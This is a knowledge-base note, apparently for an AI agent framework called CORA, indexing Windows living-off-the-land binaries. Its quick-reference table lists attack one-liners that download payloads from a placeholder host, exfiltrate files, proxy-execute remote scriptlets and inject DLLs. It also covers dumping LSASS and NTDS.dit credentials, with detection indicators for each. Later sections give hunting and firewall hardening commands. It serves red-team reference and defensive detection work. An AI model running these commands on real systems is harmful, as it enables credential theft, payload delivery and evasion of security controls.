---
title: LOLBINS
category: reasoning
engine: team_strategy_arbiter
team_role: lolbins
os_platform: windows
domain_hub: "[[knowledge/01_windows_system_process_and_sysinternals]]"
primary_tactic: Defense_Evasion_Firewall
summary: "LOLBINS — Living Off The Land Binaries, Scripts & Libraries Strategy Playbook (https://github.com/CROWInnovations/LOLBAS): Complete index of 202 Microsoft-signed binaries (117 OSBinaries, 57 OtherMSBinaries), scripts (10 OSScripts), and DLL libraries (16 OSLibraries) across 414 verified commands, 15 tactical categories (Execute, Download, Upload, AWL Bypass, UAC Bypass, Credential/LSASS/NTDS Dump, ADS, Compile, Copy, Encode/Decode), MITRE ATT&CK mappings, and Sigma/WDAC/Sysmon detections."
when_to_apply: "Apply whenever the operator, LLM, or 15 reasoning engines need Windows Living Off The Land Binaries, Scripts, or Libraries (LOLBINS / LOLBAS — https://github.com/CROWInnovations/LOLBAS) for proxy execution, file download/upload without third-party tools, Application Whitelisting (AppLocker/WDAC) or UAC bypass, LSASS/NTDS credential dumping (comsvcs.dll, ntdsutil, dsdbutil, rdrleakdiag, procdump), NTFS Alternate Data Stream (ADS) hiding, or Blue/Hunt Team LOLBin detection and WDAC hardening."
tags: [reasoning, lolbins, lolbas, lolbin, lolscript, lollib, living-off-the-land, crowinnovations, windows, certutil, rundll32, regsvr32, mshta, msbuild, installutil, cmstp, bitsadmin, wmic, forfiles, pcalua, mavinject, odbcconf, comsvcs, ntdsutil, dsdbutil, esentutl, diskshadow, regasm, regsvcs, csc, vbc, msiexec, hh, findstr, pubprn, syncappvpublishingserver, winrm, wsl, awl-bypass, uac-bypass, ads, red-team, hunt-team, blue-team]
updated: 2026-11-01 01:12:00
---
# LOLBINS — Living Off The Land Binaries, Scripts & Libraries Playbook (`LOLBINS`)

> **Official CROW Innovations Repository:** [`https://github.com/CROWInnovations/LOLBAS`](https://github.com/CROWInnovations/LOLBAS)  
> **Raw YAML Knowledge Feed:** `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/<SubFolder>/<Binary>.yml`  
> **Team Role:** `LOLBINS` (`RED_TEAM` Proxy Execution & Evasion | `HUNT_TEAM` Anomaly & IOC Hunting | `BLUE_TEAM` WDAC/AppLocker Hardening)  
> **Primary H-MDP Tactics:** `Defense_Evasion_Firewall` $\to$ `Initial_Access_Exploitation` $\to$ `Privilege_Escalation` $\to$ `Credential_Access` $\to$ `Digital_Forensics`  
> **Backlinks:** [[00_MEMORY_INDEX]] | [[commands/windows_master_command_playbook]] | [[reasoning/red_team_strategy_playbook]] | [[reasoning/hunt_team_strategy_playbook]] | [[reasoning/blue_team_strategy_playbook]] | [[reasoning/windows_digital_forensics_strategy_playbook]] | [[reasoning/windows_kernel_and_userspace_enumeration_strategy_playbook]] | [[reasoning/cyber_threat_cve_and_tools_intelligence_strategy_playbook]]

---

## 1. Overview & CROW Innovations `LOLBAS` Repository Structure

The **`LOLBINS`** section in `CORA/core/ObsidianVault/reasoning/` integrates the complete **[CROWInnovations/LOLBAS](https://github.com/CROWInnovations/LOLBAS)** (*Living Off The Land Binaries, Scripts, and Libraries*) catalog into CORA's 15-Engine Neuro-Symbolic Reasoning Pipeline and Obsidian Knowledge Graph:

- **202 Microsoft-Signed Artifacts** (`414` verified commands across `15` tactical categories):
  - **`OSBinaries` (`117` binaries):** Native Windows binaries pre-installed in `C:\Windows\System32\` and `C:\Windows\SysWOW64\`.
  - **`OSScripts` (`10` scripts):** Native Microsoft-signed PowerShell (`.ps1`), VBScript (`.vbs`), Windows Script (`.wsf`), and Batch (`.bat`) scripts in `System32` / `WinSxS`.
  - **`OSLibraries` (`16` DLLs/CPLs):** Native Windows DLLs invoked via `rundll32.exe` or `control.exe` for proxy execution, file download, or LSASS memory dumping (`comsvcs.dll`).
  - **`OtherMSBinaries` (`57` binaries):** Microsoft-signed utilities distributed with .NET Framework/SDK, Visual Studio, Active Directory (`ntdsutil.exe`, `dsdbutil.exe`), Office, SQL Server, and Sysinternals (`procdump.exe`, `adplus.exe`).
  - **`HonorableMentions` (`2` entries):** Additional documented native execution/evasion primitives.

### Complete `LOLBINS` Sub-Playbook Index (`ObsidianVault/reasoning/LOLBINS/`)
| Sub-Playbook Vault Link | Repository Path (`CROWInnovations/LOLBAS`) | Scope & Coverage |
| :--- | :--- | :--- |
| **[[reasoning/LOLBINS/lolbins_os_binaries_a_to_l]]** | [`yml/OSBinaries` (`A–L`)](https://github.com/CROWInnovations/LOLBAS/tree/master/yml/OSBinaries) | **51 Native Windows OS Binaries (`Addinutil.exe` – `Ldifde.exe`):** Includes `At.exe`, `Bitsadmin.exe`, `Certoc.exe`, `Certreq.exe`, `Certutil.exe`, `Cmd.exe`, `Cmdkey.exe`, `Cmstp.exe`, `Conhost.exe`, `Control.exe`, `Csc.exe`, `Cscript.exe`, `Diantz.exe`, `Diskshadow.exe`, `Esentutl.exe`, `Eventvwr.exe`, `Expand.exe`, `Extrac32.exe`, `Findstr.exe`, `Finger.exe`, `FltMC.exe`, `Forfiles.exe`, `Ftp.exe`, `Hh.exe`, `Ilasm.exe`, `Infdefaultinstall.exe`, `Installutil.exe`, `Jsc.exe`, `Ldifde.exe`. |
| **[[reasoning/LOLBINS/lolbins_os_binaries_m_to_z]]** | [`yml/OSBinaries` (`M–Z`)](https://github.com/CROWInnovations/LOLBAS/tree/master/yml/OSBinaries) | **66 Native Windows OS Binaries (`Makecab.exe` – `Wusa.exe`):** Includes `Mavinject.exe`, `Mmc.exe`, `MpCmdRun.exe`, `Msbuild.exe`, `Msdt.exe`, `Mshta.exe`, `Msiexec.exe`, `Netsh.exe`, `Odbcconf.exe`, `Pcalua.exe`, `Pcwrun.exe`, `Pktmon.exe`, `PrintBrm.exe`, `Psr.exe`, `Rasautou.exe`, `Reg.exe`, `Regasm.exe`, `Regsvcs.exe`, `Regsvr32.exe`, `Rpcping.exe`, `Rundll32.exe`, `Schtasks.exe`, `Scriptrunner.exe`, `Ssh.exe`, `Syncappvpublishingserver.exe`, `Tar.exe`, `Ttdinject.exe`, `Tttracer.exe`, `Verclsid.exe`, `Winget.exe`, `Wmic.exe`, `Wscript.exe`, `Wsreset.exe`. |
| **[[reasoning/LOLBINS/lolbins_os_scripts_and_libraries]]** | [`yml/OSScripts`](https://github.com/CROWInnovations/LOLBAS/tree/master/yml/OSScripts) & [`yml/OSLibraries`](https://github.com/CROWInnovations/LOLBAS/tree/master/yml/OSLibraries) | **10 Native OS Scripts (`LOLScripts`), 16 OS Libraries (`LOLLibs`) & 2 Honorable Mentions:** Includes `Pubprn.vbs`, `Syncappvpublishingserver.vbs`, `Winrm.vbs`, `Manage-bde.wsf`, `Pester.bat`, `CL_Invocation.ps1`, `CL_LoadAssembly.ps1`, `Comsvcs.dll` (`MiniDump` LSASS), `Advpack.dll`, `Ieadvpack.dll`, `Ieframe.dll`, `Mshtml.dll`, `Pcwutl.dll`, `Scrobj.dll`, `Setupapi.dll`, `Shdocvw.dll`, `Shell32.dll`, `Syssetup.dll`, `Url.dll`, `Zipfldr.dll`. |
| **[[reasoning/LOLBINS/lolbins_other_ms_binaries]]** | [`yml/OtherMSBinaries`](https://github.com/CROWInnovations/LOLBAS/tree/master/yml/OtherMSBinaries) | **57 Microsoft-Signed SDK / AD / Office / Sysinternals Binaries:** Includes `Ntdsutil.exe`, `Dsdbutil.exe`, `Procdump.exe`, `Createdump.exe`, `Dump64.exe`, `DumpMinitool.exe`, `Adplus.exe`, `Cdb.exe`, `Bginfo.exe`, `Dotnet.exe`, `Csi.exe`, `Fsi.exe`, `Msdeploy.exe`, `Msxsl.exe`, `Sqldumper.exe`, `Sqlps.exe`, `Te.exe`, `Tracker.exe`, `Update.exe`, `Vsdiagnostics.exe`, `Vsjitdebugger.exe`, `Wsl.exe`. |
| **[[reasoning/LOLBINS/lolbins_tactical_categories_and_detections]]** | [`CategoryList.md`](https://github.com/CROWInnovations/LOLBAS/blob/master/CategoryList.md) | **All 414 Commands Grouped by Tactical Category:** `Execute` (216), `Download` (51), `AWL Bypass` (48), `ADS` (36), `Dump` (21), `Copy` (10), `Compile` (8), `Upload` (5), `Credentials` (5), `UAC Bypass` (4), `Tamper` (3), `Reconnaissance` (3), `Decode` (2), `Encode` (1), `Conceal` (1). |

---

## 2. How CORA Queries `https://github.com/CROWInnovations/LOLBAS` Live (`vault_read_note`, `fetch_webpage` & `curl`)

1. **Fastest Zero-Latency Local Lookup (Recommended First Step):**
   - Use `vault_search(query="<binary_or_category>")` or `vault_read_note(note="reasoning/LOLBINS")` / `vault_read_note(note="reasoning/LOLBINS/lolbins_os_binaries_a_to_l")` to read all 202 entries offline in `< 1 ms`.
2. **Live Fetch from CROW Innovations GitHub (`fetch_webpage` Tier-1 Tool):**
   - Fetch raw YAML definition directly from `https://github.com/CROWInnovations/LOLBAS`:
     ```python
     fetch_webpage(url="https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Certutil.yml")
     fetch_webpage(url="https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSLibraries/comsvcs.yml")
     fetch_webpage(url="https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Ntdsutil.yml")
     ```
3. **Clone or Sync `CROWInnovations/LOLBAS` via Shell (`run_shell`):**
   ```bash
   git clone https://github.com/CROWInnovations/LOLBAS.git "$PROJECT_FILES_DIR/LOLBAS"
   ```

---

## 3. High-Impact Windows `LOLBINS` Quick-Reference Matrix (Top 25 Operational Primitives)

| Tactical Objective | LOLBin / LOLScript / LOLLib | MITRE ID | Verified Command (`CMD` / `PowerShell`) | Forensic IOC & Blue/Hunt Detection |
| :--- | :--- | :--- | :--- | :--- |
| **Download File (HTTP/HTTPS)** | **`Certutil.exe`** (`OSBinaries`) | `T1105` | `certutil.exe -urlcache -split -f https://<HOST>/payload.exe C:\Temp\payload.exe` | User-Agent `Microsoft-CryptoAPI/10.0` or `CertUtil URL Agent`; creates CryptnetUrlCache metadata files. |
| **Download File (Background BITS)** | **`Bitsadmin.exe`** (`OSBinaries`) | `T1197` / `T1105` | `bitsadmin /transfer job1 /download /priority high https://<HOST>/payload.exe C:\Temp\payload.exe` | Event ID `16403` (`Microsoft-Windows-Bits-Client/Operational`); `qmgr.db` job persistence. |
| **Download File via HTML Help** | **`Hh.exe`** (`OSBinaries`) | `T1105` | `hh.exe http://<HOST>/payload.exe` | `hh.exe` initiating outbound TCP connection (`Sysmon EID 3`). |
| **Download File via Finger** | **`Finger.exe`** (`OSBinaries`) | `T1105` | `finger user@<HOST> \| more +2 > C:\Temp\payload.bat` | `finger.exe` outbound TCP port `79` connection. |
| **Upload / Exfiltrate Data (HTTP POST/PUT)** | **`Certreq.exe`** (`OSBinaries`) | `T1567` | `certreq.exe -Post -config https://<HOST>/receive C:\Temp\secret.txt` | `certreq.exe` making outbound HTTPS POST to non-CA endpoint. |
| **Proxy Execute Remote SCT Scriptlet (AWL Bypass)** | **`Regsvr32.exe`** (`OSBinaries`) | `T1218.010` | `regsvr32 /s /n /u /i:http://<HOST>/payload.sct scrobj.dll` | *"Squiblydoo"*: `regsvr32.exe` loading `scrobj.dll` + network connection (`Sysmon EID 1/3/7`). |
| **Proxy Execute Remote HTA / VBScript / JScript** | **`Mshta.exe`** (`OSBinaries`) | `T1218.005` | `mshta.exe vbscript:Close(Execute("GetObject(""script:http://<HOST>/payload.sct"")"))` | `mshta.exe` spawned by `cmd`/`powershell`/Office or making external HTTP connections. |
| **Proxy Execute DLL / JS / SCT via `Rundll32`** | **`Rundll32.exe`** (`OSBinaries`) | `T1218.011` | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://<HOST>/a.sct")` | `rundll32.exe` command line containing `javascript:`, `mshtml`, or `scrobj.dll`. |
| **Proxy Execute Remote MSI Package** | **`Msiexec.exe`** (`OSBinaries`) | `T1218.007` | `msiexec /q /i http://<HOST>/payload.msi` | `msiexec.exe` with `/q` and `http://` or `https://` URI parameter. |
| **Execute Inline C# Task (AWL Bypass)** | **`Msbuild.exe`** (`OSBinaries`) | `T1127.001` | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Temp\inline_task.xml` | `msbuild.exe` executing `.xml`/`.csproj` outside Visual Studio build trees; loads `csc.exe` in-memory. |
| **Execute `.NET` Uninstaller Hook (AWL Bypass)** | **`Installutil.exe`** (`OSBinaries`) | `T1218.004` | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Temp\payload.dll` | `InstallUtil.exe` invoked with `/U` and `/LogToConsole=false` on unsigned assembly. |
| **Execute `.NET` COM Registration (AWL Bypass)** | **`Regasm.exe` / `Regsvcs.exe`** | `T1218.009` | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U C:\Temp\payload.dll` | `regasm.exe` or `regsvcs.exe` executing `[ComUnregisterFunction]` code via `/U`. |
| **Execute INF Profile (UAC + AWL Bypass)** | **`Cmstp.exe`** (`OSBinaries`) | `T1218.003` | `cmstp.exe /ni /s C:\Temp\evil_profile.inf` | `cmstp.exe` with `/s` `/ni` flags spawning child processes under `DllHost.exe`. |
| **Execute via Program Compatibility Assistant** | **`Pcalua.exe`** (`OSBinaries`) | `T1202` | `pcalua.exe -a C:\Temp\payload.exe` | `pcalua.exe -a` used as indirect command execution parent. |
| **Execute via `Forfiles` Indirect Spawn** | **`Forfiles.exe`** (`OSBinaries`) | `T1202` | `forfiles /p C:\Windows\System32 /m notepad.exe /c "C:\Temp\payload.exe"` | `forfiles.exe` with `/c` spawning unexpected child processes. |
| **Execute via WMI Process Call Create / XSL** | **`Wmic.exe`** (`OSBinaries`) | `T1047` / `T1220` | `wmic process get brief /format:"http://<HOST>/evil.xsl"` | `wmic.exe` loading remote or local `.xsl` stylesheet containing JScript/VBScript. |
| **Execute via Signed VBScript (`Pubprn.vbs`)** | **`Pubprn.vbs`** (`OSScripts`) | `T1216.001` | `cscript.exe C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 "script:http://<HOST>/a.sct"` | `cscript.exe` / `wscript.exe` executing `pubprn.vbs` with `script:http` moniker. |
| **Execute PowerShell without `powershell.exe` via `.vbs`** | **`Syncappvpublishingserver.vbs`** | `T1216` | `SyncAppvPublishingServer.vbs "n; Start-Process calc.exe"` | `wscript.exe` $\to$ `SyncAppvPublishingServer.vbs` $\to$ `powershell.exe` command injection. |
| **Inject DLL into Running Process (`PID`)** | **`Mavinject.exe`** (`OSBinaries`) | `T1055.001` | `mavinject.exe <TARGET_PID> /INJECTRUNNING C:\Temp\payload.dll` | `mavinject.exe` with `/INJECTRUNNING` command-line switch (`Sysmon EID 1/8`). |
| **Load Arbitrary DLL via ODBC Config** | **`Odbcconf.exe`** (`OSBinaries`) | `T1218.008` | `odbcconf.exe /a {REGSVR C:\Temp\payload.dll}` *(or `-f file.rsp`)* | `odbcconf.exe` with `REGSVR` or `.rsp` answer file. |
| **Dump `LSASS.exe` Memory for Credentials** | **`Comsvcs.dll`** (`OSLibraries`) | `T1003.001` | `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full` | `rundll32.exe` accessing `lsass.exe` (`Sysmon EID 10` `GrantedAccess=0x1fffff`) + `comsvcs.dll MiniDump`. |
| **Dump Active Directory `NTDS.dit` + `SYSTEM`** | **`Ntdsutil.exe` / `Dsdbutil.exe`** | `T1003.003` | `ntdsutil "ac i ntds" "ifm" "create full C:\Temp\AD" q q` | Volume Shadow Copy creation + `ntds.dit` and `SYSTEM` hive written to `C:\Temp\AD`. |
| **Copy Locked Files (`SAM`/`NTDS.dit`) or Hide in ADS** | **`Esentutl.exe`** (`OSBinaries`) | `T1003.002` / `T1564.004` | `esentutl.exe /y /vss C:\Windows\NTDS\ntds.dit /d C:\Temp\ntds.dit` | `esentutl.exe` invoked with `/y` and `/vss` against sensitive OS hives or `.dit` files. |
| **Create VSS Shadow Copy & Execute Script** | **`Diskshadow.exe`** (`OSBinaries`) | `T1003.003` / `T1218` | `diskshadow.exe /s C:\Temp\diskshadow_cmds.txt` | `diskshadow.exe /s` running `exec` commands or exposing `HARDDISKVOLUME` shadow copies. |
| **Compile C# Source to `.exe`/`.dll` on Target** | **`Csc.exe`** (`OSBinaries`) | `T1027.004` | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Temp\tool.exe C:\Temp\tool.cs` | Direct `csc.exe` invocation outside developer workstations compiling unsigned binaries. |

---

## 4. 15-Engine Neuro-Symbolic Alignment for `LOLBINS` Operations

| Team / Role | How CORA's 15 Engines & LLM Use `[[reasoning/LOLBINS]]` |
| :--- | :--- |
| **Red Team (`[[reasoning/red_team_strategy_playbook]]`)** | When third-party binaries (`nmap`, `curl`, `nc`) are missing or blocked by AppLocker/WDAC on a Windows target, Engine 5 (`associative`) & Engine 15 (`mdp_tactical`) select native `LOLBINS` primitives (`certutil`/`bitsadmin` for transfer, `msbuild`/`installutil`/`regsvr32` for AWL bypass, `comsvcs.dll`/`ntdsutil`/`esentutl` for credential access). |
| **Hunt Team (`[[reasoning/hunt_team_strategy_playbook]]`)** | Hunts abnormal parent-child relationships (`w3wp.exe`/`winword.exe` $\to$ `rundll32.exe`/`mshta.exe`/`regsvr32.exe`/`certutil.exe`), suspicious CLI switches (`-urlcache -split`, `MiniDump`, `/INJECTRUNNING`, `scrobj.dll`), and NTFS Alternate Data Streams (`dir /a /r`). |
| **Blue Team (`[[reasoning/blue_team_strategy_playbook]]`)** | Enforces Microsoft Recommended Driver & LOLBin Block Rules (WDAC / AppLocker path + hash rules for `msbuild.exe`, `installutil.exe`, `cmstp.exe`, `mshta.exe`, `cscript.exe`) and Windows Defender Firewall outbound blocks for binaries that never require internet egress (`calc.exe`, `notepad.exe`, `certutil.exe`, `hh.exe`, `regsvr32.exe`, `rundll32.exe`, `mshta.exe`, `wmic.exe`). |
| **Windows DFIR (`[[reasoning/windows_digital_forensics_strategy_playbook]]`)** | Correlates `LOLBINS` execution across Prefetch (`C:\Windows\Prefetch\<LOLBIN>-*.pf`), `Amcache.hve`, `ShimCache`, `SRUDB.dat` (network bytes sent by `certutil.exe`/`bitsadmin.exe`/`rundll32.exe`), `$UsnJrnl:$J` (`:zone.identifier` and custom `:ads` streams), and Security Event ID `4688` / Sysmon Event IDs `1`, `3`, `7`, `10`, `11`, `15`. |

---

## 5. Blue & Hunt Team Live Windows `LOLBINS` Triage & Hardening Commands

```powershell
# 1. Hunt recent LOLBin process creation in Security Event Log (Event ID 4688) or Sysmon (Event ID 1):
wevtutil qe Security /q:"*[System[(EventID=4688)] and EventData[Data[@Name='NewProcessName'] and (contains(.,'certutil') or contains(.,'rundll32') or contains(.,'regsvr32') or contains(.,'mshta') or contains(.,'msbuild') or contains(.,'installutil') or contains(.,'cmstp') or contains(.,'bitsadmin') or contains(.,'mavinject') or contains(.,'odbcconf') or contains(.,'ntdsutil') or contains(.,'esentutl'))]]" /c:25 /rd:true /f:text

# 2. Scan C:\Temp, C:\Users\Public, and C:\ProgramData for NTFS Alternate Data Streams (ADS):
powershell -NoProfile -Command "Get-ChildItem -Path C:\Temp,C:\Users\Public,C:\ProgramData -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Get-Item $_.FullName -Stream * -ErrorAction SilentlyContinue } | Where-Object { $_.Stream -ne ':$DATA' -and $_.Stream -ne 'Zone.Identifier' } | Select-Object FileName,Stream,Length"

# 3. Inspect Certutil URLCache artifacts left behind by certutil.exe -urlcache downloads:
dir /s /b /a "%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData" "C:\Windows\System32\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData" 2>nul

# 4. List all active or suspended BITS jobs (bitsadmin.exe persistence/downloads):
bitsadmin /list /allusers /verbose

# 5. Blue Team Firewall Hardening — Block outbound internet connections for high-risk LOLBins:
for %b in (certutil.exe mshta.exe regsvr32.exe rundll32.exe hh.exe finger.exe cmstp.exe cscript.exe wscript.exe wmic.exe msiexec.exe) do netsh advfirewall firewall add rule name="Block_LOLBin_Egress_%b" dir=out program="%SystemRoot%\System32\%b" action=block enable=yes
```
